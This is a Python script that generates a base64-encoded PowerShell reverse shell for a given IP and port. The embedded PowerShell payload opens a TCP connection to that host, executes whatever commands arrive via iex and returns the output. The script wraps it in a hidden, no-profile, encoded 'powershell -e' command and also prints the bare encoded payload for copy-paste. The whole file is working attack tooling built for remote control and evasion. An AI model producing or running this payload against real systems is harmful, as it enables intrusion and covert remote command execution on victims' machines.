import sys
import base64
import argparse

def generate_powershell_reverse_shell(ip_address, port):
    """
    Generates a base64-encoded PowerShell reverse shell command
    
    Args:
        ip_address (str): Target IP address
        port (int): Target port number
    
    Returns:
        str: Base64-encoded PowerShell command
    """
    # PowerShell reverse shell payload
    payload = f'''
$client = New-Object System.Net.Sockets.TCPClient("{ip_address}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
    
    # Convert to base64 (UTF-16 Little Endian without BOM)
    payload_bytes = payload.encode('utf-16le')
    encoded_payload = base64.b64encode(payload_bytes).decode()
    
    # Build the final command
    cmd = f"powershell -nop -w hidden -e {encoded_payload}"
    return cmd

def main():
    parser = argparse.ArgumentParser(
        description='Generate a base64-encoded PowerShell reverse shell',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -ip 192.168.1.100 -p 4444
  %(prog)s --ip 10.0.0.5 --port 8080
        '''
    )
    
    parser.add_argument('-ip', '--ip', 
                       dest='ip_address',
                       required=True,
                       help='Target IP address')
    
    parser.add_argument('-p', '--port', 
                       dest='port',
                       type=int,
                       required=True,
                       help='Target port number')
    
    args = parser.parse_args()
    
    # Validate port range
    if args.port < 1 or args.port > 65535:
        print("Error: Port must be between 1 and 65535")
        sys.exit(1)
    
    # Generate and print the command
    command = generate_powershell_reverse_shell(args.ip_address, args.port)
    print("\nGenerated PowerShell reverse shell command:")
    print("-" * 50)
    print(command)
    print("-" * 50)
    
    # Optional: Display just the encoded payload for copy-paste
    print("\nEncoded payload only:")
    print("-" * 50)
    payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{args.ip_address}",{args.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    payload_bytes = payload.encode('utf-16le')
    encoded_payload = base64.b64encode(payload_bytes).decode()
    print(encoded_payload)

if __name__ == "__main__":
    main()
